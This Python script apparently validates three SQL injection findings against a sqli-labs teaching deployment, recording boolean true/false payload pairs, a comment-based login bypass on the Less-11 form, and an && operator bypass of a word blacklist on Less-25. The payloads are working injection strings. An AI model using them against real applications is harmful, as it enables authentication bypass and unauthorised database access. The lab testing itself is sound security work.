"""SQLI-001, SQLI-002 and SQLI-003 boolean/error-based validation.

Each run records the normal control and a minimal true/false pair. Confirmation
requires the true input to reproduce the normal user row while the false input
does not, with only the id/uname parameter changed.
"""
from __future__ import annotations

import argparse
import json
import re
import sys
import urllib.parse
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

from wp4lib import BASE_SQLI, SOURCE_COMMIT_SQLI, Client, Run  # noqa: E402

DEPLOYMENT = "sqli-labs-wsl-01"


def login_name(text: str) -> str:
    match = re.search(r"Your Login name:\s*([^<]*)", text)
    return match.group(1).strip() if match else ""


def sql_error(text: str) -> str:
    match = re.search(r"(You have an error in your SQL syntax[^<]*)", text)
    return match.group(1).strip() if match else ""


def case_sqli001() -> dict:
    run = Run(
        "wp4-20261019-sqli001-low", "SQLI-001", "Less-1/index.php?id",
        "env=sqli-labs-wsl-01|role=anonymous|security=n/a|object=none|state=initialized",
        DEPLOYMENT, SOURCE_COMMIT_SQLI,
    )
    client = Client(BASE_SQLI)
    inputs = {
        "normal": "1",
        "true": "1' AND '1'='1",
        "false": "1' AND '1'='2",
    }
    observations = {}
    for label, value in inputs.items():
        url = "/Less-1/index.php?id=" + urllib.parse.quote(value)
        resp = client.get(url)
        run.add_response(label, resp)
        observations[label] = {
            "input": value,
            "status": resp.status,
            "login_name": login_name(resp.text),
            "sql_error": sql_error(resp.text),
            "body_bytes": len(resp.body),
        }
    run.requests.extend(client.requests)
    run.observation = {
        "endpoint": "/Less-1/index.php",
        "parameter": "id (GET)",
        "cases": observations,
        "normal_row_reproduced_by_true": observations["true"]["login_name"]
        == observations["normal"]["login_name"] != "",
        "false_returns_no_row": observations["false"]["login_name"] == "",
    }
    run.success_criteria = [
        "A normal numeric id returns an existing teaching row.",
        "The boolean-true payload returns the same row while changing only id.",
        "The boolean-false payload returns no user row, showing SQL semantics changed.",
        "No authentication or redirect is involved in this endpoint.",
    ]
    run.limitations = [
        "Only the selected Less-1 path and database account are covered.",
        "No data beyond the first row was enumerated or exported.",
    ]
    triggered = (observations["true"]["login_name"] == observations["normal"]["login_name"] != ""
                 and observations["false"]["login_name"] == "")
    run.finalize("触发" if triggered else "未触发", "有漏洞" if triggered else "证据不足")
    return run.observation


def case_sqli002() -> dict:
    run = Run(
        "wp4-20261019-sqli002-low", "SQLI-002", "Less-11/index.php:uname",
        "env=sqli-labs-wsl-01|role=anonymous|security=n/a|object=teaching-user|state=initialized",
        DEPLOYMENT, SOURCE_COMMIT_SQLI,
    )
    client = Client(BASE_SQLI)
    cases = {
        "normal": {"uname": "Dumb", "passwd": "Dumb", "submit": "Submit"},
        "true": {"uname": "Dumb'#", "passwd": "not-the-password", "submit": "Submit"},
        "false": {"uname": "Dumb' AND '1'='2#", "passwd": "not-the-password", "submit": "Submit"},
    }
    observations = {}
    for label, data in cases.items():
        resp = client.post("/Less-11/index.php", data)
        run.add_response(label, resp)
        observations[label] = {
            "uname": data["uname"],
            "status": resp.status,
            "login_name": login_name(resp.text),
            "sql_error": sql_error(resp.text),
            "has_flag_image": "flag.jpg" in resp.text,
            "body_bytes": len(resp.body),
        }
    run.requests.extend(client.requests)
    run.observation = {
        "endpoint": "/Less-11/index.php",
        "parameter": "uname (POST), passwd held constant as a non-matching value",
        "cases": observations,
        "true_comment_bypasses_password": observations["true"]["login_name"] != "",
        "false_returns_no_row": observations["false"]["login_name"] == "",
    }
    run.success_criteria = [
        "The normal account/password pair logs in and shows the teaching row.",
        "A comment sequence in uname returns the same account while the password is wrong.",
        "The false condition returns no row with the same password value and endpoint.",
        "Only uname is changed between true and false cases; passwd stays constant.",
    ]
    run.limitations = [
        "Only Less-11's POST login query is covered.",
        "This is a minimal authentication-bypass/boolean proof, not a data dump.",
    ]
    triggered = (observations["true"]["login_name"] != ""
                 and observations["false"]["login_name"] == ""
                 and observations["normal"]["login_name"] != "")
    run.finalize("触发" if triggered else "未触发", "有漏洞" if triggered else "证据不足")
    return run.observation


def case_sqli003() -> dict:
    run = Run(
        "wp4-20261019-sqli003-low", "SQLI-003", "Less-25/index.php?id",
        "env=sqli-labs-wsl-01|role=anonymous|security=n/a|object=none|state=initialized",
        DEPLOYMENT, SOURCE_COMMIT_SQLI,
    )
    client = Client(BASE_SQLI)
    cases = {
        "normal": "1",
        "true": "1' && '1'='1",
        "false": "1' && '1'='2",
    }
    observations = {}
    for label, value in cases.items():
        url = "/Less-25/index.php?id=" + urllib.parse.quote(value)
        resp = client.get(url)
        run.add_response(label, resp)
        hint = ""
        match = re.search(r"Hint: Your Input is Filtered with following result:\s*([^<]*)", resp.text)
        if match:
            hint = match.group(1).strip()
        observations[label] = {
            "input": value,
            "status": resp.status,
            "login_name": login_name(resp.text),
            "sql_error": sql_error(resp.text),
            "filtered_hint": hint,
            "body_bytes": len(resp.body),
        }
    run.requests.extend(client.requests)
    run.observation = {
        "endpoint": "/Less-25/index.php",
        "parameter": "id (GET)",
        "filter": "preg_replace('/or/i','') and preg_replace('/AND/i','') only",
        "cases": observations,
        "symbolic_and_operator_not_filtered": "&&" in cases["true"],
        "normal_row_reproduced_by_true": observations["true"]["login_name"]
        == observations["normal"]["login_name"] != "",
        "false_returns_no_row": observations["false"]["login_name"] == "",
    }
    run.success_criteria = [
        "The blacklist removes the literal words or/AND but the true && payload still returns the normal row.",
        "The false payload, differing only in the compared constant, returns no row.",
        "The filtered hint shows the blacklist did not remove the && operator.",
    ]
    run.limitations = [
        "Only Less-25's GET id path is covered.",
        "The proof relies on MySQL/MariaDB accepting && as logical AND.",
    ]
    triggered = (observations["true"]["login_name"] == observations["normal"]["login_name"] != ""
                 and observations["false"]["login_name"] == "")
    run.finalize("触发" if triggered else "未触发", "有漏洞" if triggered else "证据不足")
    return run.observation


CASES = {"001": case_sqli001, "002": case_sqli002, "003": case_sqli003}


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--case", choices=sorted(CASES) + ["all"], default="all")
    args = parser.parse_args()
    selected = list(CASES) if args.case == "all" else [args.case]
    results = {}
    for key in selected:
        results[key] = CASES[key]()
    print(json.dumps({"executed": sorted(results)}, ensure_ascii=False))


if __name__ == "__main__":
    main()
